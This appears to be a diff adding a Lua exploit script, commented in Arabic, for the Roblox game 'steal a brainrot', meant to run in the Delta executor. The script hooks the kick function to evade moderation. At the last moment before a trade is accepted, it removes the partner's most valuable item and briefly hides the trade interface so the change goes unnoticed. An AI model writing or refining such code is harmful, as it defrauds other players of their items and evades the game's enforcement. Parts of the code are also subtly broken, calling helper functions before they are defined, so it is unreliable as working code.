@@ -1,0 +1,187 @@
+--[[
+سكربت استغلال ثغرات التايمر في ماكينة الترايدينغ - steal a brainrot
+مخصص للعمل مع Delta Executor على الموبايل والويندوز
+مضاد للطرد من السيرفر (anti_kick)
+الإصدار: 1.0
+--]]
+
+-- متغيرات عامة
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+-- مرحلة الدخول (Injection / Execution)
+print("[TRADE EXPLOIT] بدء تشغيل السكربت...")
+
+-- حماية ضد الطرد (anti_kick)
+local function antiKick()
+    local oldKick
+    oldKick = hookfunction(LocalPlayer.Kick, function(...)
+        warn("[ANTI-KICK] تم محاولة طردك، تم إلغاؤها!")
+        return nil
+    end)
+    
+    -- حماية إضافية ضد الطرد عن بعد
+    local connection
+    connection = LocalPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
+        if not LocalPlayer.Parent then
+            warn("[ANTI-KICK] تمت محاولة طردك عن بعد، يتم إعادة الاتصال...")
+            connection:Disconnect()
+            -- إعادة الاتصال بالسيرفر
+            game:Load("https://www.roblox.com/games/PLACEID/steal-a-brainrot")
+        end
+    end)
+end
+
+-- مرحلة المراقبة (Monitoring)
+local function findTradeMachine()
+    -- البحث عن ماكينة الترايدينغ
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj.Name:lower():find("trade") and obj:IsA("Model") then
+            return obj
+        end
+    end
+    return nil
+end
+
+-- مرحلة تحليل الحالة (State Tracking)
+local tradeState = {
+    isActive = false,
+    currentItems = {},
+    partnerItems = {},
+    timeRemaining = 0,
+    acceptButton = nil,
+    lastChangeTime = 0
+}
+
+-- مرحلة الانتظار (Timing Window)
+local function getOptimalTiming()
+    -- حساب أفضل توقيت لتغيير العناصر
+    -- عندما يكون اللاعب على وشك الضغط على قبول أو قبل انتهاء العدّاد
+    if tradeState.timeRemaining < 1.5 and tradeState.timeRemaining > 0.5 then
+        return true -- اللحظة المثالية للتغيير
+    end
+    return false
+end
+
+-- مرحلة التغيير (Visual Manipulation)
+local function manipulateTrade()
+    -- تغيير العناصر في الترايد بدون إعلام اللاعب
+    if not tradeState.isActive or not getOptimalTiming() then
+        return
+    end
+    
+    -- البحث عن وظيفة تغيير العناصر
+    local tradeEvent = ReplicatedStorage:FindFirstChild("TradeEvent")
+    if tradeEvent then
+        -- إزالة عنصر قيم بدون إعلام الواجهة
+        local valuableItem = findMostValuableItem(tradeState.partnerItems)
+        if valuableItem then
+            -- إرسال طلب تغيير للسيرفر
+            tradeEvent:FireServer("removeItem", valuableItem.id)
+            tradeState.lastChangeTime = tick()
+            print("[TRADE EXPLOIT] تمت إزالة عنصر قيم: " .. valuableItem.name)
+            
+            -- تأخير تحديث الواجهة
+            delay(0.1, function()
+                updateTradeUI()
+            end)
+        end
+    end
+end
+
+-- مرحلة التنفيذ (Server Finalization)
+local function finalizeTrade()
+    -- التأكد من أن السيرفر يستخدم الحالة الأخيرة فقط
+    local finalizeEvent = ReplicatedStorage:FindFirstChild("FinalizeTrade")
+    if finalizeEvent then
+        finalizeEvent:FireServer(tradeState.currentItems)
+        print("[TRADE EXPLOIT] تم تنفيذ الترايد بالحالة الأخيرة")
+    end
+end
+
+-- وظائف مساعدة
+local function findMostValuableItem(items)
+    -- البحث عن أغلى عنصر في قائمة العناصر
+    local mostValuable = nil
+    local highestValue = 0
+    
+    for _, item in pairs(items) do
+        if item.value > highestValue then
+            highestValue = item.value
+            mostValuable = item
+        end
+    end
+    
+    return mostValuable
+end
+
+local function updateTradeUI()
+    -- تحديث واجهة الترايد بشكل خفي
+    local tradeGui = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeGui")
+    if tradeGui then
+        -- إخفاء التغييرات عن اللاعب
+        for _, itemFrame in pairs(tradeGui:GetDescendants()) do
+            if itemFrame:IsA("Frame") and itemFrame.Name:find("Item") then
+                itemFrame.Visible = false
+                delay(0.05, function()
+                    itemFrame.Visible = true
+                end)
+            end
+        end
+    end
+end
+
+-- تشغيل السكربت
+local function main()
+    -- تفعيل الحماية ضد الطرد
+    antiKick()
+    
+    -- البحث عن ماكينة الترايدينغ
+    local tradeMachine = findTradeMachine()
+    if not tradeMachine then
+        warn("[TRADE EXPLOIT] لم يتم العثور على ماكينة الترايدينغ")
+        return
+    end
+    
+    -- مراقبة حالة الترايد
+    local function onTradeStateChanged(newState)
+        tradeState.isActive = newState.isActive
+        tradeState.currentItems = newState.currentItems
+        tradeState.partnerItems = newState.partnerItems
+        tradeState.timeRemaining = newState.timeRemaining
+        
+        -- عند بدء الترايد
+        if tradeState.isActive then
+            print("[TRADE EXPLOIT] بدء مراقبة الترايد...")
+            
+            -- مراقبة لحظة القبول
+            RunService.Heartbeat:Connect(function()
+                if tradeState.isActive then
+                    -- التحقق من وجود زر القبول
+                    local acceptButton = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeGui"):FindFirstChild("AcceptButton")
+                    
+                    -- عندما يكون اللاعب على وشك الضغط على قبول
+                    if acceptButton and acceptButton.Visible and getOptimalTiming() then
+                        -- تنفيذ التلاعب بالعناصر
+                        manipulateTrade()
+                    end
+                end
+            end)
+        end
+    end
+    
+    -- ربط الأحداث
+    local tradeEvent = tradeMachine:FindFirstChild("TradeEvent")
+    if tradeEvent then
+        tradeEvent.OnClientEvent:Connect(onTradeStateChanged)
+    end
+    
+    print("[TRADE EXPLOIT] السكربت جاهز للعمل!")
+end
+
+-- بدء السكربت
+main()
